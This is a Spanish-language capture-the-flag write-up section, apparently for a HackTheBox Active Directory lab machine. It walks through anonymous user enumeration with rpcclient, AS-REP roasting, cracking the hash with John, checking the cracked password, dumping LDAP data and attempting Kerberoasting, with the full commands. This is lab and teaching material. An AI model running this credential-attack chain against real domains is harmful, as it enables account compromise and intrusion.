## Vulnerability Assessment {-}

### Asproasting Attack {-}

Los ataques Asproasting se pueden manejar con la utilidad `GetNPUsers.py`

```bash
cd content
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" 
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' 
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v 
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]'
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]' > users.txt
GetNPUsers.py htb.local/ -no-pass -userfile users.txt 2>/dev/null
```

Aqui vemos el TGT del usuario **svc-alfresco**. Copiamos todo el hash del usuario svc-alfresco en un fichero llamado hash
y lo crackeamos con John


### Crackeando el hash con John {-}

```bash
john -wordlists=/usr/share/wordlists/rockyou.txt hash
```

Aqui encontramos su contrase√±a. Ya podemos effectuar un Kerberoasting attack. Pero primero, como siempre, credenciales encontradas son 
credenciales que checkeamos con crackmapexec

```bash
crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

### LDAP enumeracion con ldapdomaindump {-}

Esta utilidad nos permitte recuperar en formato html las informaciones del servicio LDAP.

```bash
cd /var/www/html
ldapdomaindump -u 'htb.local/svc-alfresco' -p 's3rvice' 10.10.10.161
service apache2 start
```

y podemos mirarlo con firefox en localhost

### Kereroasting attack {-}

Los ataques Kereroasting se pueden manejar con la utilidad `GetUserSPNs.py`

```bash
GetUserSPNs.py htb.local/svc-alfresco:s3rvice@10.10.10.161 -request -dc-ip 10.10.10.161
```

Esta utilidad nos retorna un mensaje como que no son las buenas credenciales. Si es el caso vamos si nos podemos connectar
por win-rm.


